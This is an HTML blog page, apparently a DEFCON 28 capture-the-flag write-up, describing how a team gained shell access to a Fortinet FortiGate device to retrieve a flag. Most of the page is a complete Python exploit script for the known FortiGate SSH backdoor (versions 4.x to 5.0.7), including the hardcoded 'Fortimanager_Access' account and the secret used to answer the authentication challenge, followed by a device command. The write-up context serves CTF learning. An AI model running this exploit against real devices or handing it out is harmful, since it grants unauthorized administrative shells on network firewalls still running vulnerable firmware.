@@ -1,0 +1,80 @@
+<!doctype html><html lang=en><meta charset=utf-8><meta name=generator content="Hugo 0.74.3"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=color-scheme content="light dark"><meta name=supported-color-schemes content="light dark"><title>Fortinet Flag&nbsp;&ndash;&nbsp;weslack</title><link rel=stylesheet href=/css/core.min.be501171008d95a30f958daa62c92e4cf1c096f8eb655590a575c3934e35a2ff1f22631f406912aa455f8417fd84bacb.css integrity=sha384-vlARcQCNlaMPlY2qYskuTPHAlvjrZVWQpXXDk041ov8fImMfQGkSqkVfhBf9hLrL><meta name=twitter:card content="summary"><meta name=twitter:title content="Fortinet Flag"><body><section id=header><div class="header wrap"><span class="header left-side"><a class="site home" href=/><img class="site logo" src=/logo.png alt><span class="site name">weslack</span></a></span>
+<span class="header right-side"><div class="nav wrap"><nav class=nav><a class="nav item" href=/categories/>Categories</a><a class="nav item" href=/tags/>Tags</a><a class="nav item" href=/about/>About</a><a class="nav item" href=https://github%2ecom/weslack target=_blank>GitHub</a></nav></div></span></div><div class="site slogan"><span class=title>DEFCON 28 CTF Fun</span></div></section><section id=content><div class=article-container><section class="article header"><h1 class="article title">Fortinet Flag</h1><p class="article date">Fri, 07 Aug 2020 23:33:58</p></section><article class="article markdown-body"><p>Finding the exploit, we did some google-fu and learned a bit about some of the exploits for the device, but we didn&rsquo;t know which device on the network it was.</p><p>We connected to one of the devices and figured out that the favicon of the admin page was Fortinet&rsquo;s logo. From there we started to run some of the exploits. The one that worked for us was <a href=https://www.exploit-db.com/exploits/43386 target=_blank>https://www.exploit-db.com/exploits/43386</a></p><h2 id=exploit>Exploit</h2><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python</span>
+
+<span class=c1># SSH Backdoor for FortiGate OS Version 4.x up to 5.0.7</span>
+<span class=c1># Usage: ./fgt_ssh_backdoor.py &lt;target-ip&gt;</span>
+
+<span class=kn>import</span> <span class=nn>socket</span>
+<span class=kn>import</span> <span class=nn>select</span>
+<span class=kn>import</span> <span class=nn>sys</span>
+<span class=kn>import</span> <span class=nn>paramiko</span>
+<span class=kn>from</span> <span class=nn>paramiko.py3compat</span> <span class=kn>import</span> <span class=n>u</span>
+<span class=kn>import</span> <span class=nn>base64</span>
+<span class=kn>import</span> <span class=nn>hashlib</span>
+<span class=kn>import</span> <span class=nn>termios</span>
+<span class=kn>import</span> <span class=nn>tty</span>
+
+<span class=k>def</span> <span class=nf>custom_handler</span><span class=p>(</span><span class=n>title</span><span class=p>,</span> <span class=n>instructions</span><span class=p>,</span> <span class=n>prompt_list</span><span class=p>):</span>
+    <span class=n>n</span> <span class=o>=</span> <span class=n>prompt_list</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
+    <span class=n>m</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha1</span><span class=p>()</span>
+    <span class=n>m</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>12</span><span class=p>)</span>
+    <span class=n>m</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>n</span> <span class=o>+</span> <span class=s1>&#39;FGTAbc11*xy+Qqz27&#39;</span><span class=p>)</span>
+    <span class=n>m</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70</span><span class=s1>&#39;</span><span class=p>)</span>
+    <span class=n>h</span> <span class=o>=</span> <span class=s1>&#39;AK1&#39;</span> <span class=o>+</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>12</span> <span class=o>+</span> <span class=n>m</span><span class=o>.</span><span class=n>digest</span><span class=p>())</span>
+    <span class=k>return</span> <span class=p>[</span><span class=n>h</span><span class=p>]</span>
+
+
+<span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>:</span>
+        <span class=k>print</span> <span class=s1>&#39;Usage: &#39;</span> <span class=o>+</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39; &lt;target-ip&gt;&#39;</span>
+        <span class=nb>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
+
+    <span class=n>client</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>SSHClient</span><span class=p>()</span>
+    <span class=n>client</span><span class=o>.</span><span class=n>set_missing_host_key_policy</span><span class=p>(</span><span class=n>paramiko</span><span class=o>.</span><span class=n>AutoAddPolicy</span><span class=p>())</span>
+
+    <span class=k>try</span><span class=p>:</span>
+        <span class=n>client</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>username</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>allow_agent</span><span class=o>=</span><span class=bp>False</span><span class=p>,</span> <span class=n>look_for_keys</span><span class=o>=</span><span class=bp>False</span><span class=p>)</span>
+    <span class=k>except</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>ssh_exception</span><span class=o>.</span><span class=n>SSHException</span><span class=p>:</span>
+        <span class=k>pass</span>
+
+    <span class=n>trans</span> <span class=o>=</span> <span class=n>client</span><span class=o>.</span><span class=n>get_transport</span><span class=p>()</span>
+    <span class=k>try</span><span class=p>:</span>
+        <span class=n>trans</span><span class=o>.</span><span class=n>auth_password</span><span class=p>(</span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;Fortimanager_Access&#39;</span><span class=p>,</span> <span class=n>password</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>event</span><span class=o>=</span><span class=bp>None</span><span class=p>,</span> <span class=n>fallback</span><span class=o>=</span><span class=bp>True</span><span class=p>)</span>
+    <span class=k>except</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>ssh_exception</span><span class=o>.</span><span class=n>AuthenticationException</span><span class=p>:</span>
+        <span class=k>pass</span>
+
+    <span class=n>trans</span><span class=o>.</span><span class=n>auth_interactive</span><span class=p>(</span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;Fortimanager_Access&#39;</span><span class=p>,</span> <span class=n>handler</span><span class=o>=</span><span class=n>custom_handler</span><span class=p>)</span>
+    <span class=n>chan</span> <span class=o>=</span> <span class=n>client</span><span class=o>.</span><span class=n>invoke_shell</span><span class=p>()</span>
+
+    <span class=n>oldtty</span> <span class=o>=</span> <span class=n>termios</span><span class=o>.</span><span class=n>tcgetattr</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>stdin</span><span class=p>)</span>
+    <span class=k>try</span><span class=p>:</span>
+        <span class=n>tty</span><span class=o>.</span><span class=n>setraw</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>stdin</span><span class=o>.</span><span class=n>fileno</span><span class=p>())</span>
+        <span class=n>tty</span><span class=o>.</span><span class=n>setcbreak</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>stdin</span><span class=o>.</span><span class=n>fileno</span><span class=p>())</span>
+        <span class=n>chan</span><span class=o>.</span><span class=n>settimeout</span><span class=p>(</span><span class=mf>0.0</span><span class=p>)</span>
+
+        <span class=k>while</span> <span class=bp>True</span><span class=p>:</span>
+            <span class=n>r</span><span class=p>,</span> <span class=n>w</span><span class=p>,</span> <span class=n>e</span> <span class=o>=</span> <span class=n>select</span><span class=o>.</span><span class=n>select</span><span class=p>([</span><span class=n>chan</span><span class=p>,</span> <span class=n>sys</span><span class=o>.</span><span class=n>stdin</span><span class=p>],</span> <span class=p>[],</span> <span class=p>[])</span>
+            <span class=k>if</span> <span class=n>chan</span> <span class=ow>in</span> <span class=n>r</span><span class=p>:</span>
+                <span class=k>try</span><span class=p>:</span>
+                    <span class=n>x</span> <span class=o>=</span> <span class=n>u</span><span class=p>(</span><span class=n>chan</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span>
+                    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+                        <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>*** EOF</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
+                        <span class=k>break</span>
+                    <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+                    <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
+                <span class=k>except</span> <span class=n>socket</span><span class=o>.</span><span class=n>timeout</span><span class=p>:</span>
+                    <span class=k>pass</span>
+            <span class=k>if</span> <span class=n>sys</span><span class=o>.</span><span class=n>stdin</span> <span class=ow>in</span> <span class=n>r</span><span class=p>:</span>
+                <span class=n>x</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>stdin</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+                <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+                    <span class=k>break</span>
+                <span class=n>chan</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+
+    <span class=k>finally</span><span class=p>:</span>
+        <span class=n>termios</span><span class=o>.</span><span class=n>tcsetattr</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>stdin</span><span class=p>,</span> <span class=n>termios</span><span class=o>.</span><span class=n>TCSADRAIN</span><span class=p>,</span> <span class=n>oldtty</span><span class=p>)</span>
+
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+    <span class=n>main</span><span class=p>()</span>
+</code></pre></div><h2 id=getting-the-flag>Getting the flag</h2><p>After we gained access, we listed the disks to get the flag, which was the md5 of the partion label.</p><div class=highlight><pre class=chroma><code class=language-sh data-lang=sh>execute disk list
+</code></pre></div></article><section class="article labels"><a class=category href=/categories/sohoplessly-broken/>SOHOplessly Broken</a><a class=tag href=/tags/python/>python</a></section></div><div class="article bottom"><section class="article navigation"><p><a class=link href=/post/geovision-flag/><span class="iconfont icon-article"></span>GeoVision Flag</a></p></section></div></section><section id=footer><div class=footer-wrap><p class=copyright>All content is free, unencumbered, and released into the public domain. Do with it what you want. <a href=/LICENSE.txt>Unlicense</a></p><p class=powerby><span>Powered&nbsp;by&nbsp;</span><a href=https://gohugo.io target=_blank>Hugo</a><span>&nbsp;&&nbsp;</span><a href=https://themes.gohugo.io/hugo-notepadium/ target=_blank>Notepadium</a></p></div></section></body></html>
